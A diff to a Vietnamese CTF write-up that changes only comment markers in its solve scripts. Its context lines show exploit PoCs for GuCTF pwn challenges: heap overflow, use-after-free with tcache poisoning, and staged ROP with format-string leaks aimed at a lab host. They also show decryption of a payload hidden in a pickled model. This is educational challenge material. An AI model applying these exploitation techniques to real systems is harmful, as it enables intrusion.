@@ -89,9 +89,9 @@ Vì không có source code gốc, mình đưa `payload.pyc` lên [pylingual.io](
 Kết quả là source code hoàn chỉnh:
 
 ```python
-### Decompiled with PyLingual (https://pylingual.io)
-### Bytecode version: 3.10.b1 (3439)
-### Source timestamp: 2026-07-10 14:39:33 UTC
+# Decompiled with PyLingual (https://pylingual.io)
+# Bytecode version: 3.10.b1 (3439)
+# Source timestamp: 2026-07-10 14:39:33 UTC
 
 """Code that the compromised model executes while being unpickled."""
 from __future__ import annotations
@@ -250,17 +250,17 @@ Sau khi có đủ 3 giá trị, tái tạo lại thuật toán giải mã:
 ```python
 import hashlib
 
-### Trích xuất từ model.pkl
+# Trích xuất từ model.pkl
 cipher  = b'\xbf\x1d\xa5\xef7\xf6Ff\x037:L\xb8\xebK&...'
 weights = b'\x1c\xeb\x85g\n\x052\xcbE>...'
 
-### 4 từ khóa bí mật — ghép đúng định dạng như trong infer()
+# 4 từ khóa bí mật — ghép đúng định dạng như trong infer()
 sequence = b'snow|candle|tangerine|clock'
 
-### Tạo key giải mã
+# Tạo key giải mã
 key = hashlib.blake2s(weights + sequence + b'inference-cache').digest()
 
-### Keystream generator (copy từ payload.py)
+# Keystream generator (copy từ payload.py)
 def _stream(key: bytes, size: int) -> bytes:
     out = bytearray()
     counter = 0
@@ -269,7 +269,7 @@ def _stream(key: bytes, size: int) -> bytes:
         counter += 1
     return bytes(out[:size])
 
-### XOR để giải mã
+# XOR để giải mã
 plain = bytes(a ^ b for a, b in zip(cipher, _stream(key, len(cipher))))
 print(plain.decode('utf-8'))
 ```
@@ -748,7 +748,7 @@ Subword tokenizer gộp nhiều ký tự thành một token. 8 rank trong bài n
 
 `encoder.py`:
 ```python
-###!/usr/bin/env python3
+#!/usr/bin/env python3
 
 MOD = 1 << 32
 A = 1664525
@@ -795,7 +795,7 @@ Vì không gian seed chỉ có khoảng ~1 triệu trường hợp, ta có thể
 ### 4. PoC
 
 ```python
-###!/usr/bin/env python3
+#!/usr/bin/env python3
 
 MOD = 1 << 32
 A = 1664525
@@ -817,7 +817,7 @@ with open('ciphertext.txt', 'r') as f:
 
 length = len(ct_bytes)
 
-### Brute-force toàn bộ không gian seed 2^20
+# Brute-force toàn bộ không gian seed 2^20
 for seed in range(0x100000):
     ks = keystream(seed, length)
     pt = xor_bytes(ct_bytes, ks)
@@ -1036,7 +1036,7 @@ with open("packet.hex") as f:
 
 blocks = [ct[i:i+16] for i in range(0, len(ct), 16)]
 
-### Mảng guess trích xuất được từ solve.py
+# Mảng guess trích xuất được từ solve.py
 guesses = {
     1: [27, 56, 57, 57, 62, 45, 38, 51, 36, 32, 49, 126, 56, 58, 35, 58],
     2: [11, 49, 201, 229, 33, 121, 1, 213, 158, 140, 48, 210, 104, 230, 247, 179],
@@ -1156,7 +1156,7 @@ with open("secret_archive.hex") as f:
 
 cts = [bytes.fromhex(arch["ciphertext_hex"]) for arch in archives]
 
-### Dựng sẵn các dòng plaintext có thể xảy ra (đã đệm đủ khoảng trắng)
+# Dựng sẵn các dòng plaintext có thể xảy ra (đã đệm đủ khoảng trắng)
 item_opts = [b"item=" + v.encode().ljust(18, b' ') + b"\n" for v in catalog['item']]
 status_opts = [b"status=" + v.encode().ljust(12, b' ') + b"\n" for v in catalog['status']]
 sector_opts = [b"sector=" + v.encode().ljust(12, b' ') + b"\n" for v in catalog['sector']]
@@ -1949,18 +1949,18 @@ from dissect.util.compression.lzxpress_huffman import decompress
 with open('JumpList.Test/TestFiles/Bad/CALC.EXE-3FBEF7FD.pf', 'rb') as f:
     raw = f.read()
 
-### Kiểm tra magic
+# Kiểm tra magic
 assert raw[:4] == b'MAM\x04', "Không phải MAM format!"
 
-### Lấy kích thước dữ liệu gốc
+# Lấy kích thước dữ liệu gốc
 uncompressed_size = struct.unpack_from('<I', raw, 4)[0]
 print(f'Uncompressed size: {uncompressed_size} bytes')  # 47848
 
-### Giải nén
+# Giải nén
 uncompressed = decompress(raw[8:])
 print(f'Decompressed: {len(uncompressed)} bytes')
 
-### Dump 128 byte đầu để kiểm tra cấu trúc
+# Dump 128 byte đầu để kiểm tra cấu trúc
 for i in range(0, 128, 16):
     hex_part = ' '.join(f'{b:02x}' for b in uncompressed[i:i+16])
     print(f'{i:04x}: {hex_part}')
@@ -3432,7 +3432,7 @@ call rax
 ### 4. PoC
 
 ```python
-###!/usr/bin/env python3
+#!/usr/bin/env python3
 from pwn import *
 
 context.binary = ELF('./clockwork_vault', checksec=False)
@@ -3568,38 +3568,38 @@ Vậy chỉ cần overflow ghi đúng `room = 0x4543484f` và `perform = <địa
 ### 4. PoC
 
 ```python
-###!/usr/bin/env python3
-### Museum of Echoes - GuCTF pwn
-###
-### struct exhibit_t (0x30 bytes):
-###   int kind;              // +0x00  (1 = whisper, 2 = chorus)
-###   size_t room;           // +0x08  (must == 0x4543484f "OHCE" for perform_exhibit to allow calling perform)
-###   void (*perform)(exhibit_t*); // +0x10
-###   char label[24];        // +0x18
-###
-### struct chorus_t (0xb0 bytes): exhibit_t base; char intro[32]; char refrain[96];
-###
-### static exhibit_t *gallery[8];
-###
-### Bug: reclassify_exhibit() lets you flip gallery[slot]->kind between whisper(1)
-### and chorus(2) *without ever reallocating* the underlying chunk. A "whisper"
-### object is only malloc(0x50). If it's reclassified to kind=2 (chorus),
-### rewrite_exhibit() then happily writes a 95-byte "refrain" starting at
-### object-offset 0x50 -- but the chunk is only 0x50 bytes (usable ~0x58) ->
-### massive heap overflow into the *next* heap chunk.
-###
-### Two whisper exhibits allocated back-to-back sit exactly chunksize(0x60) apart
-### (malloc(0x50) -> chunksize 0x60, deterministic regardless of ASLR). So the
-### refrain overflow from slot0 lands squarely on slot1's entire exhibit_t + its
-### scratch "line" buffer, letting us set:
-###   slot1->room    = 0x4543484f      (passes perform_exhibit's guard)
-###   slot1->perform = grand_finale    (hijack target, never called normally)
-###
-### grand_finale() (an unreferenced "win" function) opens flag.txt, fgets one
-### line and printf("Flag: %s", ...); it ignores its rdi argument, so any
-### gallery pointer works. inspect_exhibit() leaks a raw function pointer
-### ("Routine: %p") which is exactly whisper_perform for a freshly-created,
-### not-yet-reclassified whisper -> free leak of that function's address.
+#!/usr/bin/env python3
+# Museum of Echoes - GuCTF pwn
+#
+# struct exhibit_t (0x30 bytes):
+#   int kind;              // +0x00  (1 = whisper, 2 = chorus)
+#   size_t room;           // +0x08  (must == 0x4543484f "OHCE" for perform_exhibit to allow calling perform)
+#   void (*perform)(exhibit_t*); // +0x10
+#   char label[24];        // +0x18
+#
+# struct chorus_t (0xb0 bytes): exhibit_t base; char intro[32]; char refrain[96];
+#
+# static exhibit_t *gallery[8];
+#
+# Bug: reclassify_exhibit() lets you flip gallery[slot]->kind between whisper(1)
+# and chorus(2) *without ever reallocating* the underlying chunk. A "whisper"
+# object is only malloc(0x50). If it's reclassified to kind=2 (chorus),
+# rewrite_exhibit() then happily writes a 95-byte "refrain" starting at
+# object-offset 0x50 -- but the chunk is only 0x50 bytes (usable ~0x58) ->
+# massive heap overflow into the *next* heap chunk.
+#
+# Two whisper exhibits allocated back-to-back sit exactly chunksize(0x60) apart
+# (malloc(0x50) -> chunksize 0x60, deterministic regardless of ASLR). So the
+# refrain overflow from slot0 lands squarely on slot1's entire exhibit_t + its
+# scratch "line" buffer, letting us set:
+#   slot1->room    = 0x4543484f      (passes perform_exhibit's guard)
+#   slot1->perform = grand_finale    (hijack target, never called normally)
+#
+# grand_finale() (an unreferenced "win" function) opens flag.txt, fgets one
+# line and printf("Flag: %s", ...); it ignores its rdi argument, so any
+# gallery pointer works. inspect_exhibit() leaks a raw function pointer
+# ("Routine: %p") which is exactly whisper_perform for a freshly-created,
+# not-yet-reclassified whisper -> free leak of that function's address.
 
 from pwn import *
 
@@ -3775,22 +3775,22 @@ Vì đây là type confusion phụ thuộc vào **race condition** với luồng
 ### 4. PoC
 
 ```python
-###!/usr/bin/env python3
-### House of Mirage - GuCTF pwn
-###
-### Bug: background "archive sweep" thread (0x33d0) frees expired sessions and
-### pushes their 0x70-byte chunk onto a custom pool freelist (0x6340) BUT never
-### clears sessions[] -> dangling pointer. Both sessions and sinks are drawn from
-### the same pool, so re-allocating a sink reuses the freed chunk => a session and
-### a sink alias the same memory (type confusion / UAF).
-###
-### A sink's flush virtual (vtable[0] = 0x3840) does, when memo_ptr & memo_len are
-### non-zero: cout.write(memo_ptr, memo_len)  -> arbitrary read primitive.
-### The "mirror import" op (option 3) writes up to 0x60 attacker bytes over the
-### session == sink object, letting us set memo_ptr = &flag_buffer (0x6220).
-### Flushing the sink then prints the flag that was fgets()'d from flag.txt.
-###
-### Only leak needed: PIE base (sink vtable pointer, read via show-session serial).
+#!/usr/bin/env python3
+# House of Mirage - GuCTF pwn
+#
+# Bug: background "archive sweep" thread (0x33d0) frees expired sessions and
+# pushes their 0x70-byte chunk onto a custom pool freelist (0x6340) BUT never
+# clears sessions[] -> dangling pointer. Both sessions and sinks are drawn from
+# the same pool, so re-allocating a sink reuses the freed chunk => a session and
+# a sink alias the same memory (type confusion / UAF).
+#
+# A sink's flush virtual (vtable[0] = 0x3840) does, when memo_ptr & memo_len are
+# non-zero: cout.write(memo_ptr, memo_len)  -> arbitrary read primitive.
+# The "mirror import" op (option 3) writes up to 0x60 attacker bytes over the
+# session == sink object, letting us set memo_ptr = &flag_buffer (0x6220).
+# Flushing the sink then prints the flag that was fgets()'d from flag.txt.
+#
+# Only leak needed: PIE base (sink vtable pointer, read via show-session serial).
 
 from pwn import *
 
@@ -3983,33 +3983,33 @@ Vì `harbor` được `malloc(0x48)` ngay đầu tiên trong `setup()`, trước
 ### 4. PoC
 
 ```python
-###!/usr/bin/env python3
-### Deep Port - GuCTF pwn  (glibc 2.39, tcache poisoning via UAF)
-###
-### Sink: dispatch() (menu opt 7) does  harbor->fn(harbor)  where harbor is a heap
-### struct (malloc(0x48) in setup) with:
-###     harbor+0x20 = fn  (= standby, prints a banner)
-###     harbor+0x28 = "flag.txt"
-### print_flag(rdi) fopen(rdi+0x28)/fgets/printf -> if we set harbor+0x20 =
-### &print_flag then dispatch() runs print_flag(harbor) and dumps flag.txt.
-###
-### Vector: release_shipment() (opt 4) free()s a shipment's buffer but never NULLs
-### the pointer -> UAF. view_shipment() (opt 3) leaks the buffer's handler pointer
-### (= standby, gives PIE) and the buffer address (heap). With a heap leak we can
-### forge the safe-linked tcache fd and make malloc hand back the harbor chunk.
-###
-### harbor is malloc'd first in setup, so it sits exactly 0x50 below the first
-### shipment chunk:  harbor = chunk0 - 0x50  (both are 0x48 requests -> 0x50 bins).
-###
-### Plan:
-###   create s0,s1 (size 0x48)                      -> two 0x50 chunks
-###   view s0        -> leak PIE (standby) + heap (chunk0); harbor = chunk0-0x50
-###   free s0, free s1                              -> tcache[0x50]: s1 -> s0  (n=2)
-###   edit s1: fd = (s1>>12) ^ harbor               -> tcache[0x50]: s1 -> harbor
-###   create s2 (size 0x48)                         -> malloc returns s1
-###   create s3 (size 0x48, payload)                -> malloc returns harbor;
-###        payload = 0x20 pad + p64(print_flag) + b"flag.txt\0"
-###   dispatch (opt 7)                              -> print_flag(harbor) -> FLAG
+#!/usr/bin/env python3
+# Deep Port - GuCTF pwn  (glibc 2.39, tcache poisoning via UAF)
+#
+# Sink: dispatch() (menu opt 7) does  harbor->fn(harbor)  where harbor is a heap
+# struct (malloc(0x48) in setup) with:
+#     harbor+0x20 = fn  (= standby, prints a banner)
+#     harbor+0x28 = "flag.txt"
+# print_flag(rdi) fopen(rdi+0x28)/fgets/printf -> if we set harbor+0x20 =
+# &print_flag then dispatch() runs print_flag(harbor) and dumps flag.txt.
+#
+# Vector: release_shipment() (opt 4) free()s a shipment's buffer but never NULLs
+# the pointer -> UAF. view_shipment() (opt 3) leaks the buffer's handler pointer
+# (= standby, gives PIE) and the buffer address (heap). With a heap leak we can
+# forge the safe-linked tcache fd and make malloc hand back the harbor chunk.
+#
+# harbor is malloc'd first in setup, so it sits exactly 0x50 below the first
+# shipment chunk:  harbor = chunk0 - 0x50  (both are 0x48 requests -> 0x50 bins).
+#
+# Plan:
+#   create s0,s1 (size 0x48)                      -> two 0x50 chunks
+#   view s0        -> leak PIE (standby) + heap (chunk0); harbor = chunk0-0x50
+#   free s0, free s1                              -> tcache[0x50]: s1 -> s0  (n=2)
+#   edit s1: fd = (s1>>12) ^ harbor               -> tcache[0x50]: s1 -> harbor
+#   create s2 (size 0x48)                         -> malloc returns s1
+#   create s3 (size 0x48, payload)                -> malloc returns harbor;
+#        payload = 0x20 pad + p64(print_flag) + b"flag.txt\0"
+#   dispatch (opt 7)                              -> print_flag(harbor) -> FLAG
 
 from pwn import *
 
@@ -4018,14 +4018,14 @@ context.log_level = 'info'
 
 HOST, PORT = '10.112.0.12', 49543
 
-### Bản hand-out là PIE + canary. Remote service là bản build KHÁC: NON-PIE
-### (base 0x400000), KHÔNG có stack canary, và có prologue endbr64 (CET). Việc
-### này dịch chuyển toàn bộ hàm, nên offset print_flag của bản local không áp
-### dụng được cho remote. Đã xác nhận địa chỉ tuyệt đối trên remote (non-PIE,
-### cố định) bằng cách leak standby rồi đọc .text qua primitive arbitrary-read
-### dựng từ chính UAF này:
-###     standby     = 0x4012b6
-###     print_flag  = 0x4012d5   (= standby + 0x1f; endbr64;push;sub rsp,0xa0;...)
+# Bản hand-out là PIE + canary. Remote service là bản build KHÁC: NON-PIE
+# (base 0x400000), KHÔNG có stack canary, và có prologue endbr64 (CET). Việc
+# này dịch chuyển toàn bộ hàm, nên offset print_flag của bản local không áp
+# dụng được cho remote. Đã xác nhận địa chỉ tuyệt đối trên remote (non-PIE,
+# cố định) bằng cách leak standby rồi đọc .text qua primitive arbitrary-read
+# dựng từ chính UAF này:
+#     standby     = 0x4012b6
+#     print_flag  = 0x4012d5   (= standby + 0x1f; endbr64;push;sub rsp,0xa0;...)
 STANDBY_OFF        = 0x1209    # bản local PIE
 PRINTFLAG_OFF      = 0x1247    # bản local PIE
 PRINTFLAG_REMOTE   = 0x4012d5  # bản remote non-PIE (địa chỉ tuyệt đối)
@@ -4175,29 +4175,29 @@ Giải pháp là ROP **hai tầng**: chain đầu tiên (vừa đủ trong cửa
 ### 4. PoC
 
 ```python
-###!/usr/bin/env python3
-### Red Tide Terminal - GuCTF pwn  (seccomp ORW ROP)
-###
-### seccomp (install_filter) allows only: read(0), write(1), openat(257),
-### exit(60), exit_group(231)  -> classic open/read/write the flag.
-###
-### Two bugs:
-###   log_identity(): printf([rbp-0x90]) on the user buffer -> FORMAT STRING.
-###   route_packet(): read(0, [rbp-0x60], n) with only  n <= 0xf0  checked, while
-###       buffer -> return is 0x68 -> STACK OVERFLOW.
-###
-### Only 0xf0-0x68 bytes of ROP fit in the first read, too small for a full ORW
-### chain, so we stage: the overflow chain does read(0, bss, 0x200) then pivots
-### rsp into bss (pop rbp; leave;ret) and runs the real ORW chain from there.
-###
-### The binary ships the gadgets: pop rdi/rsi/rdx/rax ; syscall.
-###
-### BUILD DIFFERENCE (same story as the other GuCTF chals): the hand-out is
-### PIE + canary, but the REMOTE service is a NON-PIE, NO-canary, endbr64/CET
-### rebuild. So on remote there is no canary to leak/preserve and every offset
-### shifts. The non-PIE addresses below were recovered at runtime by turning the
-### format string into an arbitrary read (%N$s with the target in the buffer) and
-### scanning .text for the gadget block (each gadget = endbr64; pop; ret; nop; ud2).
+#!/usr/bin/env python3
+# Red Tide Terminal - GuCTF pwn  (seccomp ORW ROP)
+#
+# seccomp (install_filter) allows only: read(0), write(1), openat(257),
+# exit(60), exit_group(231)  -> classic open/read/write the flag.
+#
+# Two bugs:
+#   log_identity(): printf([rbp-0x90]) on the user buffer -> FORMAT STRING.
+#   route_packet(): read(0, [rbp-0x60], n) with only  n <= 0xf0  checked, while
+#       buffer -> return is 0x68 -> STACK OVERFLOW.
+#
+# Only 0xf0-0x68 bytes of ROP fit in the first read, too small for a full ORW
+# chain, so we stage: the overflow chain does read(0, bss, 0x200) then pivots
+# rsp into bss (pop rbp; leave;ret) and runs the real ORW chain from there.
+#
+# The binary ships the gadgets: pop rdi/rsi/rdx/rax ; syscall.
+#
+# BUILD DIFFERENCE (same story as the other GuCTF chals): the hand-out is
+# PIE + canary, but the REMOTE service is a NON-PIE, NO-canary, endbr64/CET
+# rebuild. So on remote there is no canary to leak/preserve and every offset
+# shifts. The non-PIE addresses below were recovered at runtime by turning the
+# format string into an arbitrary read (%N$s with the target in the buffer) and
+# scanning .text for the gadget block (each gadget = endbr64; pop; ret; nop; ud2).
 
 from pwn import *
 
@@ -4337,27 +4337,27 @@ Sau khi pivot, chain ORW đầy đủ (giống hệt bản gốc: `openat("flag.
 ### 4. PoC
 
 ```python
-###!/usr/bin/env python3
-### Red Tide Terminal Revenge - GuCTF pwn  (seccomp ORW ROP, tighter)
-###
-### Same seccomp ORW setup as red_tide_terminal (read/write/openat/exit), but the
-### overflow window is smaller:
-###   log_identity(struct): fgets(struct,0x28); fgets(struct+0x28,0x28);
-###       printf("AUDIT[%#lx]: ", *(struct+0x50));   <- leaks an obfuscated ptr
-###       printf(struct+0x28);                        <- FORMAT STRING (2nd codename)
-###   route_packet(): read(0, [rbp-0x50], n) with only n <= 0xb0 checked;
-###       buffer -> return is 0x58, leaving just 11 qwords of ROP.
-###
-### Format string leaks canary (%9) and a PIE return addr (start_session+0x56, %11).
-###
-### 11 qwords is too small for a full ORW chain, so we stage into .bss and pivot.
-### Trick to fit stage-1 in 11 qwords: pre-set the OVERWRITTEN saved rbp = bss, so
-### route_packet's own `leave;ret` already loads rbp=bss. Stage-1 then only needs
-###   read(0, bss, 0x200) ; leave;ret        (10 qwords)
-### and the final leave;ret pivots rsp into bss to run the real ORW chain.
-###
-### REMOTE (per the GuCTF pattern) is a NON-PIE / no-canary / endbr64 rebuild; the
-### absolute addresses were recovered via the fmt-string arbitrary read.
+#!/usr/bin/env python3
+# Red Tide Terminal Revenge - GuCTF pwn  (seccomp ORW ROP, tighter)
+#
+# Same seccomp ORW setup as red_tide_terminal (read/write/openat/exit), but the
+# overflow window is smaller:
+#   log_identity(struct): fgets(struct,0x28); fgets(struct+0x28,0x28);
+#       printf("AUDIT[%#lx]: ", *(struct+0x50));   <- leaks an obfuscated ptr
+#       printf(struct+0x28);                        <- FORMAT STRING (2nd codename)
+#   route_packet(): read(0, [rbp-0x50], n) with only n <= 0xb0 checked;
+#       buffer -> return is 0x58, leaving just 11 qwords of ROP.
+#
+# Format string leaks canary (%9) and a PIE return addr (start_session+0x56, %11).
+#
+# 11 qwords is too small for a full ORW chain, so we stage into .bss and pivot.
+# Trick to fit stage-1 in 11 qwords: pre-set the OVERWRITTEN saved rbp = bss, so
+# route_packet's own `leave;ret` already loads rbp=bss. Stage-1 then only needs
+#   read(0, bss, 0x200) ; leave;ret        (10 qwords)
+# and the final leave;ret pivots rsp into bss to run the real ORW chain.
+#
+# REMOTE (per the GuCTF pattern) is a NON-PIE / no-canary / endbr64 rebuild; the
+# absolute addresses were recovered via the fmt-string arbitrary read.
 
 from pwn import *
 
@@ -4829,9 +4829,9 @@ Dưới đây là script Python trích xuất thẳng cờ bằng luồng Assemb
 
 `solve.py`:
 ```python
-###!/usr/bin/env python3
+#!/usr/bin/env python3
 
-### Mảng 48 bytes trích xuất từ 0x18002d5a0 trong wrongkube_validator.dll (bản +++)
+# Mảng 48 bytes trích xuất từ 0x18002d5a0 trong wrongkube_validator.dll (bản +++)
 ARR = bytes.fromhex(
     '79694d7bb7ad642a5d0bb78d5c528ddf301ad2872aeeefd9'
     'e5be9cb008df2be010f58ff60e04fa5adc9b3d7dbc490b78')
@@ -4921,9 +4921,9 @@ Dưới đây là script Python trích xuất thẳng flag bằng cách mô ph�
 
 `solve.py`:
 ```python
-###!/usr/bin/env python3
+#!/usr/bin/env python3
 
-### Mảng 45 bytes trích xuất từ 0x18002b310 trong wrongkube_validator.dll bản mới
+# Mảng 45 bytes trích xuất từ 0x18002b310 trong wrongkube_validator.dll bản mới
 ARR = bytes.fromhex(
     '5af15fcc5eb7c05c993f14789329288441b7d56a193399e6'
     'bd5eae554d00ee6e253f6a29ab99faa90d34562f7200')
@@ -5017,9 +5017,9 @@ Dưới đây là đoạn script Python tái tạo lại thuật toán giải m�
 
 `solve.py`:
 ```python
-###!/usr/bin/env python3
+#!/usr/bin/env python3
 
-### Mảng 46 bytes trích xuất từ 0x18002bf00 trong wrongkube_validator.dll
+# Mảng 46 bytes trích xuất từ 0x18002bf00 trong wrongkube_validator.dll
 ARR = bytes.fromhex(
     '079f0864d3e9f960d86c37a9d4185d53d642fe3a6cac57f8'
     '1d4a0455ca6fea13a8c2008802d720317b5b7491313e')
